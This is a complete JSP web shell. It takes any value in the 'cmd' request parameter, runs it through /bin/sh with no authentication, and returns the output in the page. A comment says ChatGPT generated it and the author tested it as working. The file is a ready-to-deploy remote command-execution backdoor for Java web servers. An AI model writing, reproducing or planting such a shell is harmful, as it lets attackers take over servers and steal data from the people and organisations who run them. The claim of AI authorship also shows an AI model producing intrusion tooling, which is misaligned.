<%@ page import="java.io.*" %>  
<%  
    // Generated with ChatGPT and tested its working by Me
    // Check if the "cmd" parameter is provided in the HTTP request  
    if (request.getParameter("cmd") != null) {  
        String cmd = request.getParameter("cmd"); // Get the command from the request  
        StringBuilder output = new StringBuilder(); // Store command output  

        try {  
            // Create a process to execute the command using /bin/sh (Linux shell)
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});

            // Read the command's standard output (stdout)
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

            // Read the command's error output (stderr)
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));

            String line;  
            // Read and store stdout output line by line
            while ((line = reader.readLine()) != null) {  
                output.append(line).append("\n");  
            }

            // Read and store stderr output line by line (for errors)
            while ((line = errorReader.readLine()) != null) {  
                output.append(line).append("\n");  
            }

            // Close the readers to free up system resources
            reader.close();  
            errorReader.close();  

            // Wait for the command to finish execution
            p.waitFor();  
        } catch (Exception e) {  
            // Capture and display any exceptions that occur during execution
            output.append("Error: ").append(e.toString());  
        }  

        // Display the command output inside a <pre> tag for better formatting
        out.println("<pre>" + output.toString() + "</pre>");  
    }  
%>  
